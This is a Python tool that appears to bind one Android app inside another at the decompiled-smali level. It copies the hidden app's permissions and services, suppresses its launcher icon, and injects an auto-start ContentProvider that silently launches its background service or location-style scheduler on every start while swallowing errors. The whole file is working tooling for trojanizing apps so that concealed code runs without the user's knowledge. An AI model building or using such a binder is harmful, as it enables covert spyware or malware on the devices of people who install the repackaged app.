"""
manifest_merge.py - merge the minor app's manifest into the major app's, and
inject an auto-start hook so the minor background service starts by itself.

The hook is a generated ContentProvider. Android instantiates every declared
provider automatically, before Application.onCreate, with no edits to either
app's own code. Its onCreate() just starts the chosen service. This is what
makes the whole merge automatic instead of needing hand-edited smali.
"""
import os
import re
import xml.etree.ElementTree as ET

ANDROID = "http://schemas.android.com/apk/res/android"
ET.register_namespace("android", ANDROID)
A = f"{{{ANDROID}}}"

# components we copy from minor into major
COPY_TAGS = ("service", "receiver", "provider", "meta-data")
# permissions / features at the manifest top level
TOP_TAGS = ("uses-permission", "uses-permission-sdk-23", "uses-feature", "permission")


def _pkg(manifest_root):
    return manifest_root.get("package")


def _qualify(name, pkg):
    """Resolve a possibly-relative android:name against a package."""
    if name is None:
        return None
    if name.startswith("."):
        return pkg + name
    if "." not in name:
        return pkg + "." + name
    return name


def list_services(minor_dir):
    """Return fully-qualified service names declared by the minor app."""
    root = ET.parse(os.path.join(minor_dir, "AndroidManifest.xml")).getroot()
    pkg = _pkg(root)
    app = root.find("application")
    out = []
    if app is not None:
        for s in app.findall("service"):
            out.append(_qualify(s.get(f"{A}name"), pkg))
    return out


def app_class(minor_dir):
    """The minor app's custom Application class, or None."""
    root = ET.parse(os.path.join(minor_dir, "AndroidManifest.xml")).getroot()
    app = root.find("application")
    if app is None:
        return None
    name = app.get(f"{A}name")
    if not name or name in ("android.app.Application",):
        return None
    return _qualify(name, _pkg(root))


def detect_scheduler(minor_dir):
    """
    Guess how the minor app schedules its periodic work by scanning its smali.
    This tells us whether the schedule survives a recents-clear, and where it
    is likely registered (so we hook the right thing).
    """
    signatures = {
        "WorkManager":   ("androidx/work/", "PeriodicWorkRequest", "WorkManagerImpl"),
        "JobScheduler":  ("Landroid/app/job/JobScheduler;", "JobInfo$Builder"),
        "AlarmManager":  ("Landroid/app/AlarmManager;", "setExactAndAllowWhileIdle",
                          "setInexactRepeating"),
    }
    hits = {k: 0 for k in signatures}
    for d in os.listdir(minor_dir):
        if not d.startswith("smali"):
            continue
        for root, _, files in os.walk(os.path.join(minor_dir, d)):
            for f in files:
                if not f.endswith(".smali"):
                    continue
                try:
                    txt = open(os.path.join(root, f), encoding="utf-8",
                               errors="ignore").read()
                except OSError:
                    continue
                for name, sigs in signatures.items():
                    if any(s in txt for s in sigs):
                        hits[name] += 1
    found = {k: v for k, v in hits.items() if v}
    # ordered by how OS-durable each mechanism is
    for pref in ("WorkManager", "JobScheduler", "AlarmManager"):
        if pref in found:
            return pref, found
    return None, found


def _oncreate_body(target):
    """
    Build the body of the provider's onCreate() for the chosen target.
    `target` is either:
      - a service FQCN  -> start that service (startForegroundService/startService)
      - "call:<fqcn>:<method>:object"  -> invoke a Kotlin-object method(Context)
      - "call:<fqcn>:<method>:static"  -> invoke a static method(Context)
    In every case v0 holds the Context.
    """
    if target.startswith("call:"):
        _, fqcn, method, kind = target.split(":", 3)
        cls = "L" + fqcn.replace(".", "/") + ";"
        if kind == "object":
            invoke = (f"    sget-object v1, {cls}->INSTANCE:{cls}\n"
                      f"    invoke-virtual {{v1, v0}}, {cls}->"
                      f"{method}(Landroid/content/Context;)V")
        else:
            invoke = (f"    invoke-static {{v0}}, {cls}->"
                      f"{method}(Landroid/content/Context;)V")
        return (
            "    invoke-virtual {p0}, Landroid/content/ContentProvider;->"
            "getContext()Landroid/content/Context;\n"
            "    move-result-object v0\n"
            "    :try_start\n"
            f"{invoke}\n"
            "    :try_end\n"
            "    .catch Ljava/lang/Throwable; {:try_start .. :try_end} :catch\n"
            "    goto :ret\n"
            "    :catch\n"
            "    move-exception v1\n"
            "    :ret")
    # service target
    svc = "L" + target.replace(".", "/") + ";"
    return (
        "    invoke-virtual {p0}, Landroid/content/ContentProvider;->"
        "getContext()Landroid/content/Context;\n"
        "    move-result-object v0\n"
        "    new-instance v1, Landroid/content/Intent;\n"
        f"    const-class v2, {svc}\n"
        "    invoke-direct {v1, v0, v2}, Landroid/content/Intent;->"
        "<init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
        "    :try_start\n"
        "    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I\n"
        "    const/16 v3, 0x1a\n"
        "    if-lt v2, v3, :pre_o\n"
        "    invoke-virtual {v0, v1}, Landroid/content/Context;->"
        "startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
        "    goto :done\n"
        "    :pre_o\n"
        "    invoke-virtual {v0, v1}, Landroid/content/Context;->"
        "startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
        "    :done\n"
        "    :try_end\n"
        "    .catch Ljava/lang/Throwable; {:try_start .. :try_end} :catch\n"
        "    goto :ret\n"
        "    :catch\n"
        "    move-exception v1\n"
        "    :ret")


def _provider_smali(provider_class, target):
    cls = "L" + provider_class.replace(".", "/") + ";"
    body = _oncreate_body(target)
    return f""".class public {cls}
.super Landroid/content/ContentProvider;

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/content/ContentProvider;-><init>()V
    return-void
.end method

.method public onCreate()Z
    .locals 4
{body}
    const/4 v0, 0x1
    return v0
.end method

.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .locals 1
    const/4 v0, 0x0
    return-object v0
.end method

.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method

.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 1
    const/4 v0, 0x0
    return v0
.end method
"""


_SCHED_WORDS = ("enable", "schedule", "start", "init", "setup",
                "ensure", "begin", "register")
_METHOD_RE = re.compile(
    r"\.method\s+(?P<flags>[\w ]*?)\s*(?P<name>[\w$]+)"
    r"\(Landroid/content/Context;\)V")


def detect_bootstraps(minor_dir):
    """
    Find the minor app's OWN entry points that kick off its background work — a
    public method taking a single Context, callable without an instance (a static
    method, or a method on a Kotlin `object` singleton). These register the
    periodic job (e.g. `object LocationScheduler { fun enable(Context) }`), unlike
    the library's internal services.

    We DON'T require the WorkManager reference to be in the same .smali file: in
    Kotlin the real enqueue is often compiled into a separate helper/lambda class,
    so the scheduler's own file may only reference it indirectly. Instead we key
    off scheduler-style method NAMES on the app's own classes, and use an
    app-wide "uses a background scheduler" check only to rank.

    Returns dicts ordered best-first:
      {class, method, kind ('object'|'static'), token, label}
    """
    root = ET.parse(os.path.join(minor_dir, "AndroidManifest.xml")).getroot()
    pkg = _pkg(root)
    if not pkg:
        return []
    pkg_path = pkg.replace(".", "/")
    markers = ("Landroidx/work/", "enqueue", "PeriodicWork",
               "Landroid/app/AlarmManager;", "Landroid/app/job/")

    cands = []
    for d in os.listdir(minor_dir):
        if not d.startswith("smali"):
            continue
        base = os.path.join(minor_dir, d, pkg_path)
        if not os.path.isdir(base):
            continue
        for croot, _, files in os.walk(base):
            for f in files:
                if not f.endswith(".smali"):
                    continue
                try:
                    txt = open(os.path.join(croot, f),
                               encoding="utf-8", errors="ignore").read()
                except OSError:
                    continue
                m = re.search(r"\.class[^\n]*?(L[\w/$]+;)", txt)
                if not m:
                    continue
                cls = m.group(1)
                fqcn = cls[1:-1].replace("/", ".")
                is_object = f"INSTANCE:{cls}" in txt
                file_has_marker = any(mk in txt for mk in markers)
                for mm in _METHOD_RE.finditer(txt):
                    flags, name = mm.group("flags"), mm.group("name")
                    if "public" not in flags or name == "<init>":
                        continue
                    if "static" in flags:
                        kind = "static"
                    elif is_object:
                        kind = "object"
                    else:
                        continue   # instance method, no singleton -> can't call
                    name_sched = any(w in name.lower() for w in _SCHED_WORDS)
                    # keep only promising entry points: a scheduler-style name,
                    # or a class that itself references a scheduler
                    if not (name_sched or file_has_marker):
                        continue
                    score = 0 if name_sched else 1
                    cands.append((score, {
                        "class": fqcn, "method": name, "kind": kind,
                        "token": f"call:{fqcn}:{name}:{kind}",
                        "label": f"{fqcn}.{name}()"}))
    cands.sort(key=lambda c: c[0])
    seen, out = set(), []
    for _, c in cands:
        if c["token"] not in seen:
            seen.add(c["token"])
            out.append(c)
    return out


def merge(major_dir, minor_dir, target, log):
    major_mf = os.path.join(major_dir, "AndroidManifest.xml")
    minor_mf = os.path.join(minor_dir, "AndroidManifest.xml")
    mtree = ET.parse(major_mf)
    mroot = mtree.getroot()
    nroot = ET.parse(minor_mf).getroot()
    mpkg, npkg = _pkg(mroot), _pkg(nroot)
    mapp = mroot.find("application")
    napp = nroot.find("application")

    # 1. top-level permissions / features (dedupe by android:name)
    have = {e.get(f"{A}name") for e in mroot if e.tag in TOP_TAGS}
    added = 0
    for e in list(nroot):
        if e.tag in TOP_TAGS and e.get(f"{A}name") not in have:
            mroot.append(e)
            have.add(e.get(f"{A}name"))
            added += 1
    log(f"[manifest] added {added} permissions/features")

    # 2. services / receivers / providers from minor's <application>
    copied = 0
    if napp is not None and mapp is not None:
        existing = {(c.tag, _qualify(c.get(f"{A}name"), mpkg))
                    for c in mapp if c.tag in COPY_TAGS}
        for c in list(napp):
            if c.tag not in COPY_TAGS:
                continue            # skip activities: no launcher icon for minor
            fq = _qualify(c.get(f"{A}name"), npkg)
            if (c.tag, fq) in existing:
                continue
            c.set(f"{A}name", fq)   # force fully-qualified so it resolves in merged app
            # a provider's authority must be unique; re-root it under the minor pkg
            auth = c.get(f"{A}authorities")
            if auth:
                c.set(f"{A}authorities", npkg + ".merged." + auth.split(".")[-1])
            mapp.append(c)
            copied += 1
    log(f"[manifest] copied {copied} services/receivers/providers")

    # 3. the auto-start provider
    provider_class = mpkg + ".merged.AutoStartProvider"
    prov = ET.SubElement(mapp, "provider")
    prov.set(f"{A}name", provider_class)
    prov.set(f"{A}authorities", mpkg + ".merged.autostart")
    prov.set(f"{A}exported", "false")
    prov.set(f"{A}enabled", "true")
    prov.set(f"{A}initOrder", "2147483647")   # run as early as possible

    # emit its smali into a fresh folder
    smali_dirs = [d for d in os.listdir(major_dir) if d.startswith("smali")]

    def idx(d):
        return 1 if d == "smali" else int(d.replace("smali_classes", ""))
    n = max((idx(d) for d in smali_dirs), default=1) + 1
    out_dir = os.path.join(major_dir, f"smali_classes{n}",
                           *provider_class.split(".")[:-1])
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "AutoStartProvider.smali"), "w") as fh:
        fh.write(_provider_smali(provider_class, target))
    if target.startswith("call:"):
        _, fqcn, method, _kind = target.split(":", 3)
        log(f"[manifest] auto-start provider added, will call {fqcn}.{method}()")
    else:
        log(f"[manifest] auto-start provider added, will start {target}")

    mtree.write(major_mf, encoding="utf-8", xml_declaration=True)
    return target
